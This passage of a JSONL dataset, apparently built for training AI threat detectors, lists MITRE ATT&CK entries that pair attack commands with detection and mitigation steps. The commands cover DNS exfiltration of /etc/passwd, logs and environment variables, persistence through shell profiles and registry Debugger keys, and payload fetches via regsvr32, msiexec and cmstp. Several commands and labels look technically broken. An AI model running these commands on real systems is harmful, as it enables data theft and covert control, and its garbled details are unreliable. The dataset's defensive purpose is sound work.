{"id":432,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using curl to communicate with Google Cloud Storage for C2.","command":"curl -H \"Authorization: Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)\" https://storage.googleapis.com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)-bucket/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt","detection":"Monitor curl GCS: `ps aux | grep curl | grep storage.googleapis.com`; Network traffic: `tcpdump -i any host storage.googleapis.com`.","mitigation":"Restrict curl: `chmod 700 /usr/bin/curl`; Block GCS: `iptables -A OUTPUT -d storage.googleapis.com -j DROP`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect curl-based C2 via Google Cloud Storage by analyzing HTTP headers, GCS URLs, and file creation patterns; recommend storage blocking."}
{"id":433,"tactic":"Persistence","technique":"T1546.011: Application Shimming","threat":"Using sdbinst for DNS tunneling persistence via application shimming.","command":"sdbinst http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sdb) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor sdbinst: `wmic process where name='sdbinst.exe' get commandline | findstr http`; Event ID 4688.","mitigation":"Restrict sdbinst: `icacls %windir%\\System32\\sdbinst.exe /deny Everyone:RX`; Block SDB downloads: `netsh advfirewall firewall add rule name='Block sdbinst' dir=out program='%windir%\\System32\\sdbinst.exe' action=block`.","references":["MITRE ATT&CK T1546.011: https://attack.mitre.org/techniques/T1546/011/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect application shimming for DNS tunneling persistence by analyzing sdbinst HTTP downloads, SDB files, and DNS query patterns; suggest SDB download restrictions."}
{"id":434,"tactic":"Defense Evasion","technique":"T1218.010: Regsvr32","threat":"Using regsvr32 to execute DNS tunneling DLL with obfuscated URL.","command":"regsvr32 /s http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)[.]com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor regsvr32 HTTP: `wmic process where name='regsvr32.exe' get commandline | findstr http`; YARA rule: `rule Regsvr32ObfDnsTunnel { strings: $a = /regsvr32.*http.*\[.\]/ nocase; condition: $a }`.","mitigation":"Restrict regsvr32: `icacls %windir%\\System32\\regsvr32.exe /deny Everyone:RX`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block regsvr32' dir=out program='%windir%\\System32\\regsvr32.exe' action=block`.","references":["MITRE ATT&CK T1218.010: https://attack.mitre.org/techniques/T1218/010/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect regsvr32-based DNS tunneling with obfuscated URLs by analyzing HTTP DLL downloads, regsvr32 command-line arguments, and DNS query patterns; suggest DLL download restrictions."}
{"id":435,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using nslookup with PTR records for DNS tunneling C2.","command":"nslookup -type=PTR $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor PTR queries: `tshark -Y 'dns.qry.type == 12' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect DNS tunneling via nslookup PTR queries by analyzing query frequency, base64-encoded subdomains, and PTR record patterns; suggest DNS filtering."}
{"id":436,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using PowerShell to exfiltrate firewall rules via DNS TXT queries.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $fw = Get-NetFirewallRule | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($fw)); Resolve-DnsName -Type TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor firewall DNS: `wmic process where name='powershell.exe' get commandline | findstr Get-NetFirewallRule`; DNS TXT spikes: `tshark -Y 'dns.qry.type == 16'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block TXT DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell firewall rules exfiltration via DNS TXT queries by analyzing base64-encoded subdomains, Get-NetFirewallRule execution, and DNS traffic patterns; suggest DNS filtering."}
{"id":437,"tactic":"Command and Control","technique":"T1572: Protocol Tunneling","threat":"Using traceroute with UDP for C2 tunneling.","command":"traceroute -U $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -q 1 -w 1 -m 10 -p $(echo c2cmd | base64 -w0)","detection":"Monitor traceroute UDP: `wmic process where name='tracert.exe' get commandline | findstr -U`; Anomalous UDP traffic: `tshark -Y 'udp' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict traceroute: `icacls %windir%\\System32\\tracert.exe /deny Everyone:RX`; Block UDP: `netsh advfirewall firewall add rule name='Block UDP' dir=out action=block protocol=UDP`.","references":["MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect UDP-based C2 tunneling via traceroute by analyzing packet patterns, base64-encoded data, and UDP traffic anomalies; suggest UDP filtering."}
{"id":438,"tactic":"Persistence","technique":"T1546.004: Unix Shell Configuration Modification","threat":"Adding DNS tunneling script to zshrc for persistence.","command":"echo \"dig +short TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) > /dev/null\" >> ~/.zshrc","detection":"Monitor zshrc changes: `cat ~/.zshrc | grep dig | grep TXT`; Audit file changes: `auditctl -w ~/.zshrc -p wa`.","mitigation":"Restrict zshrc writes: `chmod 600 ~/.zshrc`; Monitor shell configuration changes.","references":["MITRE ATT&CK T1546.004: https://attack.mitre.org/techniques/T1546/004/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect DNS tunneling persistence in zshrc by analyzing dig TXT commands, base64-encoded subdomains, and file modifications; suggest file protections."}
{"id":439,"tactic":"Defense Evasion","technique":"T1218.007: Msiexec","threat":"Using msiexec to install DNS tunneling MSI with obfuscated URL.","command":"msiexec /quiet /i http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)[.]com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msi) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor msiexec HTTP: `wmic process where name='msiexec.exe' get commandline | findstr http`; YARA rule: `rule MsiexecObfDnsTunnel { strings: $a = /msiexec.*http.*\[.\]/ nocase; condition: $a }`.","mitigation":"Restrict msiexec: `icacls %windir%\\System32\\msiexec.exe /deny Everyone:RX`; Block MSI downloads: `netsh advfirewall firewall add rule name='Block msiexec' dir=out program='%windir%\\System32\\msiexec.exe' action=block`.","references":["MITRE ATT&CK T1218.007: https://attack.mitre.org/techniques/T1218/007/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect msiexec-based DNS tunneling MSI installations with obfuscated URLs by analyzing HTTP downloads, msiexec command-line arguments, and DNS query patterns; suggest MSI download restrictions."}
{"id":440,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using PowerShell to perform DNS tunneling with SRV records.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Resolve-DnsName -Type SRV _$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)._tcp.$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor SRV queries: `tshark -Y 'dns.qry.type == 33' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; PowerShell DNS: `wmic process where name='powershell.exe' get commandline | findstr Resolve-DnsName`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block SRV DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect PowerShell DNS tunneling with SRV records by analyzing query patterns, base64-encoded subdomains, and SRV record usage; suggest DNS filtering."}
{"id":441,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using dig to exfiltrate process list via DNS A queries.","command":"dig +short A $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(ps aux | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig A queries: `tcpdump -i any port 53 | grep A`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect dig-based DNS exfiltration of process list via A queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS inspection."}
{"id":442,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using Invoke-WebRequest for C2 via GitLab CI/CD artifacts.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://gitlab.com/api/v4/projects/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/jobs/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/artifacts/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt -OutFile C:\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt\"","detection":"Monitor Invoke-WebRequest GitLab: `wmic process where name='powershell.exe' get commandline | findstr gitlab.com`; Network traffic: `tshark -Y 'http.host contains gitlab.com'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block GitLab API: `netsh advfirewall firewall add rule name='Block GitLab' dir=out action=block remoteip=172.65.251.78`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect Invoke-WebRequest C2 via GitLab CI/CD artifacts by analyzing HTTP requests, GitLab API URLs, and file creation patterns; recommend API blocking."}
{"id":443,"tactic":"Persistence","technique":"T1546.013: PowerShell Profile","threat":"Adding DNS tunneling script to PowerShell profile with obfuscation.","command":"echo \"$(echo Resolve-DnsName -Type TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null | Out-String | ForEach-Object {$_ -replace ' ',''})\" >> $PROFILE.CurrentUserAllHosts","detection":"Monitor PowerShell profiles: `Get-Content $PROFILE.CurrentUserAllHosts | findstr Resolve-DnsName`; Event ID 4663.","mitigation":"Restrict profile writes: `icacls $PROFILE.CurrentUserAllHosts /deny Everyone:WX`; Audit profile changes: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1546.013: https://attack.mitre.org/techniques/T1546/013/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect obfuscated DNS tunneling persistence in PowerShell profiles by analyzing Resolve-DnsName commands, base64-encoded subdomains, and file modifications; suggest profile protections."}
{"id":444,"tactic":"Defense Evasion","technique":"T1218.003: CMSTP","threat":"Using cmstp to execute DNS tunneling INF with obfuscated URL.","command":"cmstp /ni /s http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)[.]com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).inf) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor cmstp HTTP: `wmic process where name='cmstp.exe' get commandline | findstr http`; YARA rule: `rule CmstpObfDnsTunnel { strings: $a = /cmstp.*http.*\[.\]/ nocase; condition: $a }`.","mitigation":"Restrict cmstp: `icacls %windir%\\System32\\cmstp.exe /deny Everyone:RX`; Block INF downloads: `netsh advfirewall firewall add rule name='Block cmstp' dir=out program='%windir%\\System32\\cmstp.exe' action=block`.","references":["MITRE ATT&CK T1218.003: https://attack.mitre.org/techniques/T1218/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect cmstp-based DNS tunneling INF execution with obfuscated URLs by analyzing HTTP downloads, cmstp command-line arguments, and DNS query patterns; suggest INF download restrictions."}
{"id":445,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using nslookup with AAAA records for DNS tunneling C2.","command":"nslookup -type=AAAA $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor AAAA queries: `tshark -Y 'dns.qry.type == 28' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect DNS tunneling via nslookup AAAA queries by analyzing query frequency, base64-encoded subdomains, and AAAA record patterns; suggest DNS filtering."}
{"id":446,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using PowerShell to exfiltrate environment variables via DNS TXT queries.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $env = Get-ChildItem Env: | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($env)); Resolve-DnsName -Type TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor env DNS: `wmic process where name='powershell.exe' get commandline | findstr Get-ChildItem`; DNS TXT spikes: `tshark -Y 'dns.qry.type == 16'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block TXT DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell environment variable exfiltration via DNS TXT queries by analyzing base64-encoded subdomains, Get-ChildItem execution, and DNS traffic patterns; suggest DNS filtering."}
{"id":447,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using curl to communicate with GitHub Pages for C2.","command":"curl -H \"User-Agent: $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 16)\" https://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).github.io/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt","detection":"Monitor curl GitHub: `ps aux | grep curl | grep github.io`; Network traffic: `tcpdump -i any host github.io`.","mitigation":"Restrict curl: `chmod 700 /usr/bin/curl`; Block GitHub Pages: `iptables -A OUTPUT -d github.io -j DROP`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect curl-based C2 via GitHub Pages by analyzing HTTP headers, GitHub Pages URLs, and file creation patterns; recommend URL blocking."}
{"id":448,"tactic":"Persistence","technique":"T1546.008: Accessibility Features","threat":"Using utilman for DNS tunneling persistence.","command":"reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe /v Debugger /t REG_SZ /d \"nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)\" /f","detection":"Monitor utilman registry: `reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe | findstr nslookup`; Event ID 4657.","mitigation":"Restrict utilman writes: `regini -h deny HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1546.008: https://attack.mitre.org/techniques/T1546/008/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect utilman-based DNS tunneling persistence by analyzing registry changes, nslookup TXT queries, and DNS traffic patterns; suggest registry protections."}
{"id":449,"tactic":"Defense Evasion","technique":"T1218.004: InstallUtil","threat":"Using InstallUtil to execute DNS tunneling .NET assembly.","command":"InstallUtil /U http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor InstallUtil HTTP: `wmic process where name='InstallUtil.exe' get commandline | findstr http`; YARA rule: `rule InstallUtilDnsTunnel { strings: $a = /InstallUtil.*http/ nocase; condition: $a }`.","mitigation":"Restrict InstallUtil: `icacls %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /deny Everyone:RX`; Block .NET downloads: `netsh advfirewall firewall add rule name='Block InstallUtil' dir=out program='%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe' action=block`.","references":["MITRE ATT&CK T1218.004: https://attack.mitre.org/techniques/T1218/004/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect InstallUtil-based DNS tunneling .NET execution by analyzing HTTP downloads, InstallUtil command-line arguments, and DNS query patterns; suggest .NET download restrictions."}
{"id":450,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using dig with MX records for DNS tunneling C2.","command":"dig +short MX $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig MX queries: `tcpdump -i any port 53 | grep MX`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect dig-based DNS tunneling with MX records by analyzing query patterns, base64-encoded subdomains, and MX record usage; suggest DNS inspection."}
{"id":451,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using nslookup to exfiltrate system logs via DNS CNAME queries.","command":"nslookup -type=CNAME $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(cat /var/log/syslog | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor CNAME queries: `tshark -Y 'dns.qry.type == 5' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect nslookup-based DNS exfiltration of system logs via CNAME queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS filtering."}
{"id":452,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using Invoke-WebRequest for C2 via AWS S3 bucket.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).s3.amazonaws.com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt -OutFile C:\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt\"","detection":"Monitor Invoke-WebRequest S3: `wmic process where name='powershell.exe' get commandline | findstr s3.amazonaws.com`; Network traffic: `tshark -Y 'http.host contains s3.amazonaws.com'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block S3: `netsh advfirewall firewall add rule name='Block S3' dir=out action=block remoteip=52.216.0.0/15`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect Invoke-WebRequest C2 via AWS S3 by analyzing HTTP requests, S3 URLs, and file creation patterns; recommend S3 blocking."}
{"id":453,"tactic":"Persistence","technique":"T1546.012: Image File Execution Options Injection","threat":"Using IFEO to inject DNS tunneling executable.","command":"reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe /v Debugger /t REG_SZ /d \"nslookup -type=SRV _$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)._tcp.$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)\" /f","detection":"Monitor IFEO registry: `reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe | findstr nslookup`; Event ID 4657.","mitigation":"Restrict IFEO writes: `regini -h deny HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1546.012: https://attack.mitre.org/techniques/T1546/012/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect IFEO-based DNS tunneling persistence by analyzing registry changes, nslookup SRV queries, and DNS traffic patterns; suggest registry protections."}
{"id":454,"tactic":"Defense Evasion","technique":"T1218.008: Odbcconf","threat":"Using odbcconf to execute DNS tunneling DLL.","command":"odbcconf /S /A {REGSVR http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)}","detection":"Monitor odbcconf HTTP: `wmic process where name='odbcconf.exe' get commandline | findstr http`; YARA rule: `rule OdbcconfDnsTunnel { strings: $a = /odbcconf.*http/ nocase; condition: $a }`.","mitigation":"Restrict odbcconf: `icacls %windir%\\System32\\odbcconf.exe /deny Everyone:RX`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block odbcconf' dir=out program='%windir%\\System32\\odbcconf.exe' action=block`.","references":["MITRE ATT&CK T1218.008: https://attack.mitre.org/techniques/T1218/008/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect odbcconf-based DNS tunneling DLL execution by analyzing HTTP downloads, odbcconf command-line arguments, and DNS query patterns; suggest DLL download restrictions."}
{"id":455,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using PowerShell to perform DNS tunneling with PTR records.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Resolve-DnsName -Type PTR $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor PTR queries: `tshark -Y 'dns.qry.type == 12' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; PowerShell DNS: `wmic process where name='powershell.exe' get commandline | findstr Resolve-DnsName`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block PTR DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect PowerShell DNS tunneling with PTR records by analyzing query patterns, base64-encoded subdomains, and PTR record usage; suggest DNS filtering."}
{"id":456,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using dig to exfiltrate user list via DNS SOA queries.","command":"dig +short SOA $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(cat /etc/passwd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig SOA queries: `tcpdump -i any port 53 | grep SOA`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect dig-based DNS exfiltration of user list via SOA queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS inspection."}
{"id":457,"tactic":"Command and Control","technique":"T1572: Protocol Tunneling","threat":"Using PowerShell to tunnel C2 via DNS over HTTPS (DoH).","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://dns.google/dns-query?name=$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)&type=TXT -Method GET | Out-Null\"","detection":"Monitor DoH traffic: `tshark -Y 'tcp.port == 443' | grep dns.google`; PowerShell DoH: `wmic process where name='powershell.exe' get commandline | findstr dns.google`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block DoH: `netsh advfirewall firewall add rule name='Block DoH' dir=out action=block remoteip=8.8.8.8,8.8.4.4`.","references":["MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect PowerShell DoH-based DNS tunneling by analyzing HTTPS requests to DoH resolvers, base64-encoded subdomains, and TXT query patterns; suggest DoH blocking."}
{"id":458,"tactic":"Persistence","technique":"T1546.007: Netsh Portproxy","threat":"Using netsh portproxy for DNS tunneling persistence.","command":"netsh interface portproxy add v4tov4 listenport=$(shuf -i 1024-65535 -n 1) listenaddress=0.0.0.0 connectport=53 connectaddress=$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor netsh portproxy: `netsh interface portproxy show all | findstr 53`; Event ID 4688.","mitigation":"Restrict netsh: `icacls %windir%\\System32\\netsh.exe /deny Everyone:RX`; Block portproxy: `netsh advfirewall firewall add rule name='Block Portproxy' dir=out action=block protocol=TCP localport=1024-65535`.","references":["MITRE ATT&CK T1546.007: https://attack.mitre.org/techniques/T1546/007/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect netsh portproxy-based DNS 